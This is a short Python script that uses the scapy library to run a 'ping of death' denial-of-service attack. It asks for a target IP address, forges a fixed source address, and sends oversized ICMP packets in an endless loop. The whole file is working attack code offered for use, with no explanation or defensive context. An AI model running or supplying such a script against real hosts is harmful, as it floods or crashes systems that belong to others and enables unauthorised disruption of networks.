from ast import While
from scapy.all import *

ip = input("IP: ")

def POF(ip):
    SOURCE_IP="192.168.2.102"
    TARGET_IP=ip
    MESSAGE="T"
    NUMBER_PACKETS=5

    pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
    send(NUMBER_PACKETS*pingOFDeath)

while(True):
    POF(ip)
